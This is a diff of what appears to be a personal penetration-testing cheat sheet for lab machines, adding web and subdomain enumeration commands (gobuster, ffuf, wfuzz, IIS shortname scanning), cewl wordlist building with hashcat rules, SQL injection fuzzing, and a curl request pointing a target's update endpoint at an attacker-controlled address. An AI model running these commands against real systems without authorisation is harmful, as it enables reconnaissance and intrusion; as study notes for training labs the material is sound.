@@ -12,7 +12,6 @@ sudo nmap -p80 --script=http-enum $ip
 gobuster dir -u http://loopback:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://jeeves.htb:50000/FUZZ/"
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://editorial.htb/FUZZ"
-gobuster dns -d soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
 gobuster dir -u http://$ip -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
 # for api busting
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
@@ -24,13 +23,22 @@ gobuster dir -u http://$ip:5002 -w /opt/SecLists/Discovery/Web-Content/combined_
 feroxbuster -k -u https://streamio.htb -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 [Enter] -> c -f {number of search to cancel}
 
+# Subdomains
+gobuster dns -d soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+python dome.py -m active -d nagoya-industries.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+
+java -jar iis_shortname_scanner.jar $domurl/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
+cd /opt/windows/sns && go run main.go -u http://nagoya.nagoya-industries.com
+ffuf -k -u "$domurl/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
+/opt/SecLists/Discovery/Web-Content/content_discovery_all.txt
+
 # Fuzzing APIs
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/objects.txt --hc 404 $url/FUZZ
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt --hc 404 $url/FUZZ
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt --hc 404 $url/FUZZ
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_words.txt --hc 404 $url/FUZZ
-ffuf -k -u $url/api/FUZZ -w ~/repos/offsec/lists/lil-fuzz.txt
-ffuf -k -u $url/api/FUZZ -w ~/repos/offsec/lists/sqli.txt
+ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/lil-fuzz.txt
+ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/sqli.txt
 curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/update
 curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/updat
 ```
@@ -71,6 +79,7 @@ Look at the cookies.. if there's a cookie name that you don't know, it could be 
 8. Create a wordlist from the webpage using cewl:
 
 ```bash
+cewl -g --with-numbers -d 20 $url |grep -v CeWL >> custom-wordlist.txt
 cewl http://example.com -d 4 -m 5 -w cewl.txt
 hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt > cewl-best64.txt
 ```
